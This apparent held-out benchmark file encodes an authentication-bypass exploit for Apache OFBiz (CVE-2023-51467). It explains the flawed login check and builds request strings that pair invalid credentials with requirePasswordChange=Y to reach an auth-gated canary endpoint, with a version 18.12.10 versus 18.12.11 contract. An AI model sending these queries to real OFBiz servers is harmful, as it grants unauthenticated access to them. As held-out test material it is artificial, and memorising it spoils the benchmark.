#!/usr/bin/env python3
"""[HELD-OUT] CVE-2023-51467 residual -- authentication bypass the CVE-2023-49070 fix
left open (incomplete fix), driven over the REAL Apache OFBiz control endpoint.

CVE-2023-49070 only REMOVED the XML-RPC sink; it never touched the login predicate.
OFBiz LoginWorker.checkLogin -> login() still contained the flaw: with
`requirePasswordChange=Y` supplied together with NON-EMPTY but INVALID credentials, the
userLogin service returns ERROR, yet login() (18.12.10, line ~605) returns

    return requirePasswordChange ? "requirePasswordChange" : "error";

i.e. "requirePasswordChange" instead of "error". Back in checkLogin the gate is

    if (username == null || (password == null && token == null)
            || "error".equals(login(request, response))) { return "error"; }

Since login() returned "requirePasswordChange" (not "error") and USERNAME/PASSWORD are
non-empty, ALL three disjuncts are false -> the guard falls through and checkLogin
returns "success" => the auth="true" resource is served to an UNAUTHENTICATED attacker.

We aim it at the benign authz-canary request /pcbcanary/control/flag, which is gated by
OFBiz's own <security auth="true"/> -> the real checkLogin. On a successful bypass the
canary groovy event writes ${PCB_FLAG} to the response.

Contract (verified on REAL OFBiz Docker via oracle.py):
  * V1 = 18.12.10 -> login() returns "requirePasswordChange"; checkLogin="success"
                     -> /pcbcanary/control/flag serves ${PCB_FLAG}.  REACHES.
  * V2 = 18.12.11 -> CVE-2023-51467 fix (commit 1dcfa071804a): login() returns "error"
                     on userLogin failure; checkLogin="error" -> flag withheld.  BLOCKED.

The per-run ${PCB_FLAG} lives only in the environment (baked into the canary event at
boot); it is absent from this file and from the canary component source.
"""
from __future__ import annotations

FLAG_PATH = "/pcbcanary/control/flag"

# Non-empty INVALID credentials reach the userLogin service (so the empty-creds early
# return is NOT taken) and fail auth, hitting login()'s failure-return line that 18.12.11
# fixes. requirePasswordChange=Y flips that line's result from "error" to
# "requirePasswordChange" on 18.12.10. A second vector uses different non-empty invalid
# creds to show the bypass is not credential-specific.
VECTORS = ["requirePasswordChange_invalid_creds", "requirePasswordChange_invalid_creds2"]

_QUERIES = {
    "requirePasswordChange_invalid_creds": "USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y",
    "requirePasswordChange_invalid_creds2": "USERNAME=nosuchuser&PASSWORD=nosuchpass&requirePasswordChange=Y",
}


def query(vector: str = "requirePasswordChange_invalid_creds") -> str:
    return _QUERIES[vector]


def candidate(vector: str = "requirePasswordChange_invalid_creds") -> dict:
    return {
        "id": "cve-2023-51467-" + vector,
        "path": FLAG_PATH,
        "method": "GET",
        "query": query(vector),
    }


if __name__ == "__main__":
    import json
    print(json.dumps([candidate(v) for v in VECTORS], indent=2))
